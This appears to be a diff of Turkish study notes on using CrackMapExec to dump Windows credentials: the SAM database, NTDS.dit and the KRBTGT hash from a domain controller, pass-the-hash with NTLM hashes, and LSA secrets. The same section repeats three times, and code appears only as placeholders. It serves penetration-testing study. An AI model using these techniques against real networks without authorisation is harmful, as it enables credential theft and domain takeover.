-Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
 
-Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.
 
 
 ### SAM
-SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
 
+SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.
 
 ### Dumping SAM
-![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
-![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+{{CODE_BLOCK_164}}
 
 
 ### NTDS Active Directory Database
 
-Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
 
-https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.
 
-Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+### Domain Controller üzerinden NTDS database dump etme
 
-Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+{{CODE_BLOCK_165}}
 
+`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.
 
-### Domain Controller'dan NTDS veritabanını boşaltma
-![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
-![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
-![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
-![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
-![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
-![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+### Yalnızca KRBTGT Hesabının Dump Edilmesi
 
---ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+{{CODE_BLOCK_166}}
 
-
-### Yalnızca KRBTGT Hesabının Boşaltılması
-![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
-
-Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
 
 
 ### Yalnızca Enabled Hesapları Gösterme
-![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
-![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
-![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
-![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+{{CODE_BLOCK_167}}
 
 
-### Using the Secrets (hashes)
+### Secrets (hash'leri) kullanma
 
-Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 
 
-CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
-
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:
 
 ### Using NTLM Hashes
-![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+{{CODE_BLOCK_168}}
 
 NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
 
 
 ### LSA Secrets/Cached Credentials
 
-CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.
 
-LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
 
 
-
+Burada Kaldım 
 ### LSA'yı inceleyin
 
 ![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
@@ -15484,80 +15637,67 @@ Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“�
 Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
 
 
-Burada kaldım . 
-
-
 ### Gizli Bilgileri Bulma ve Kullanma
-Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
 
-Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.
 
 
 ### SAM
-SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
 
+SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.
 
 ### Dumping SAM
-![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
-![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+{{CODE_BLOCK_164}}
 
 
 ### NTDS Active Directory Database
 
-Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
 
-https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.
 
-Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+### Domain Controller üzerinden NTDS database dump etme
 
-Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+{{CODE_BLOCK_165}}
 
+`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.
 
-### Domain Controller'dan NTDS veritabanını boşaltma
-![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
-![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
-![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
-![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
-![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
-![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+### Yalnızca KRBTGT Hesabının Dump Edilmesi
 
---ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+{{CODE_BLOCK_166}}
 
-
-### Yalnızca KRBTGT Hesabının Boşaltılması
-![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
-
-Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
 
 
 ### Yalnızca Enabled Hesapları Gösterme
-![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
-![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
-![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
-![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+{{CODE_BLOCK_167}}
 
 
-### Using the Secrets (hashes)
+### Secrets (hash'leri) kullanma
 
-Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 
 
-CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
-
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:
 
 ### Using NTLM Hashes
-![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+{{CODE_BLOCK_168}}
 
 NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
 
 
 ### LSA Secrets/Cached Credentials
 
-CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.
 
-LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
 
 
-
+Burada Kaldım 
 ### LSA'yı inceleyin
 
 ![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
@@ -17294,80 +17434,67 @@ Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“�
 Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
 
 
-Burada kaldım . 
-
-
 ### Gizli Bilgileri Bulma ve Kullanma
-Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
 
-Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.
 
 
 ### SAM
-SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
 
+SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.
 
 ### Dumping SAM
-![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
-![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+{{CODE_BLOCK_164}}
 
 
 ### NTDS Active Directory Database
 
-Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı nesneleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için tersine çevrilebilir şifreleme etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
+Kimlik bilgilerinin alınabileceği bir başka yer de Active Directory veritabanıdır. ntds.dit dosyası, kullanıcı objeleri, gruplar ve grup üyeliği hakkındaki bilgiler de dahil olmak üzere Active Directory verilerini depolayan bir veritabanıdır. Özellikle, dosya aynı zamanda domain'deki tüm kullanıcılar için parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap için [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleştirilmişse açık metin parolalarını da saklar). Bir Domain Admin hesabına veya bir replikasyon/DCSync gerçekleştirme ayrıcalıklarına sahip başka bir hesaba erişimimiz varsa, bir Domain Controller'dan hash'leri dökebiliriz
 
-https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption
+Hash'leri dump etmek için `--ntds` seçeneğini kullanmamız gerekir, aşağıdaki örnekte `robert` kullanıcısı bir Domain Admin değildir, ancak `replikasyon` gerçekleştirme ayrıcalıklarına sahiptir.
 
-Hash'leri dump etmek için --ntds seçeneğini kullanmamız gerekir, aşağıdaki örnekte robert kullanıcısı bir Domain Admin değildir, ancak replikasyon gerçekleştirme ayrıcalıklarına sahiptir.
+### Domain Controller üzerinden NTDS database dump etme
 
-Not: Aşağıdaki alıştırmalar proxy zincirlerini kullanır. Proxy zincirlerinin nasıl kurulacağı hakkında bilgi için CME ile Proxy Zincirleri bölümüne bakın.
+{{CODE_BLOCK_165}}
 
+`--ntds` seçeneğini kullanırken `--user` ve `--enabled` seçeneklerini dahil edebiliriz. Eğer `--user` kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dump alalım.
 
-### Domain Controller'dan NTDS veritabanını boşaltma
-![Pasted image 20241203104633.png](/img/user/resimler/Pasted%20image%2020241203104633.png)
-![Pasted image 20241203104643.png](/img/user/resimler/Pasted%20image%2020241203104643.png)
-![Pasted image 20241203104652.png](/img/user/resimler/Pasted%20image%2020241203104652.png)
-![Pasted image 20241203104711.png](/img/user/resimler/Pasted%20image%2020241203104711.png)
-![Pasted image 20241203104720.png](/img/user/resimler/Pasted%20image%2020241203104720.png)
-![Pasted image 20241203104725.png](/img/user/resimler/Pasted%20image%2020241203104725.png)
+### Yalnızca KRBTGT Hesabının Dump Edilmesi
 
---ntds seçeneğini kullanırken --user ve --enabled seçeneklerini dahil edebiliriz. Eğer --user kullanırsak ayıklamak istediğimiz kullanıcıyı belirtebiliriz. KRBTGT hesabı için hash dökümünü alalım.
+{{CODE_BLOCK_166}}
 
-
-### Yalnızca KRBTGT Hesabının Boşaltılması
-![Pasted image 20241203104803.png](/img/user/resimler/Pasted%20image%2020241203104803.png)
-
-Eğer --enabled olarak belirtirsek, sadece ekranda etkin olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
+Eğer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanıcıları gösterecek ve bize etkin kullanıcıların listesini çıkarma seçeneği sunacaktır.
 
 
 ### Yalnızca Enabled Hesapları Gösterme
-![Pasted image 20241203105248.png](/img/user/resimler/Pasted%20image%2020241203105248.png)
-![Pasted image 20241203105301.png](/img/user/resimler/Pasted%20image%2020241203105301.png)
-![Pasted image 20241203105312.png](/img/user/resimler/Pasted%20image%2020241203105312.png)
-![Pasted image 20241203105319.png](/img/user/resimler/Pasted%20image%2020241203105319.png)
+
+{{CODE_BLOCK_167}}
 
 
-### Using the Secrets (hashes)
+### Secrets (hash'leri) kullanma
 
-Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için Pass the Hash tekniğini kullanabiliriz. 
+Elde ettiğimiz şifreler NTLM hash'leridir. Hash'leri kırmayı deneyebilir veya parolayı kırmadan kullanıcı olarak kimlik doğrulaması yapmak için `Pass the Hash` tekniğini kullanabiliriz. 
 
-CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren -H seçeneğine sahiptir:
-
+CrackMapExec, parola yerine kimlik doğrulama yöntemi olarak bir NTLM hash'i gerektiren `-H` seçeneğine sahiptir:
 
 ### Using NTLM Hashes
-![Pasted image 20241203105537.png](/img/user/resimler/Pasted%20image%2020241203105537.png)
+
+{{CODE_BLOCK_168}}
 
 NTLM kimlik doğrulaması SMB, WinRM , RDP, LDAP ve MSSQL protokolleri için desteklenir
 
 
 ### LSA Secrets/Cached Credentials
 
-CrackMapExec, herhangi bir aracı çalıştırmadan remote makineden hash'leri dökmek için çeşitli teknikler uygulayan impacket-secretsdump'dan taşınan --lsa seçeneği ile birlikte gelir. Önbelleğe alınmış kimlik bilgileri, local makine key listesi,[ Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları ve servis kimlik bilgileri dahil olmak üzere LSA Sırlarını döker.
+CrackMapExec, remote makineden herhangi bir agent çalıştırmadan hash dump işlemi gerçekleştiren `impacket-secretsdump`'tan alınmış `--lsa` seçeneğiyle birlikte gelir. Bu seçenek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak üzere LSA Secrets'ı dump eder.
 
-LSA Secrets, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
+`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafından kullanılan kritik veriler için benzersiz bir korumalı depolama alanıdır. LSA, bir sistemin local security policy'sini yönetmek, denetlemek, kimlik doğrulamak, kullanıcıların sistemde oturumunu açmak, özel verileri depolamak vb. için tasarlanmıştır. Kullanıcıların ve sistemlerin hassas verileri gizli dosyalarda saklanır. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarları verileri şifrelemek için kullanılır
 
 
-
+Burada Kaldım 
 ### LSA'yı inceleyin
 
 ![Pasted image 20241203105931.png](/img/user/resimler/Pasted%20image%2020241203105931.png)
@@ -19110,80 +19237,67 @@ Not: Herhangi bir parola yapılandırılmamışsa, `-p` seçeneğini boş `(“�
 Bu bölümde, CrackMapExec kullanarak komutları yürütmek için üç farklı protokol keşfettik ve daha önce komutları yürütmek için MSSQL'in nasıl kullanılacağını tartıştık. Yazım sırasında, CrackMapExec komutları yürütmek için diğer dört protokolü desteklemektedir. Bir sonraki bölümde CrackMapExec'in kimlik bilgilerini ayıklamak için nasıl kullanılacağı tartışılacaktır.
 
 
-Burada kaldım . 
-
-
 ### Gizli Bilgileri Bulma ve Kullanma
-Parola çıkarma söz konusu olduğunda CrackMapExec çok güçlüdür. On workstation'ı tehlikeye attığımızı ve hepsinden kimlik bilgilerini almak için LSASS işleminin belleğini boşaltmak istediğimizi düşünün; CrackMapExec bunu yapabilir.
 
-Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dökmek için donatıldığı yöntemleri keşfedeceğiz.
+Parola çıkarma söz konusu olduğunda, CrackMapExec oldukça güçlüdür. On workstation ele geçirdiğimizi ve tümünden kimlik bilgilerini almak için LSASS process'inin belleğini dump istediğimizi düşünelim; CrackMapExec bunu yapabilir.
+
+Bu bölümde, CrackMapExec'in Windows kimlik bilgilerini dump için sunduğu yöntemleri inceleyeceğiz.
 
 
 ### SAM
-SAM veritabanı tüm local kullanıcıların kimlik bilgilerini içerir ve birçok yönetici local kimlik bilgilerini birden fazla makinede tekrar kullandığından bunları almak çok önemlidir. SMB ve WinRM protokollerinde bulunan -- sam seçeneğini kullanarak SAM veritabanının içeriğini hızlı bir şekilde alabiliriz.
 
+SAM database, tüm local kullanıcıların kimlik bilgilerini içerir ve birçok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandığı için bunları ele geçirmek kritik öneme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanılabilen `--sam` seçeneğini kullanarak SAM database içeriğini hızlı bir şekilde alabiliriz.
 
 ### Dumping SAM
-![Pasted image 20241203104055.png](/img/user/resimler/Pasted%20image%2020241203104055.png)
-![Pasted image 20241203104100.png](/img/user/resimler/Pasted%20image%2020241203104100.png)
+
+{{CODE_BLOCK_164}}
 
 
 ### NTDS Active Directory Database
 
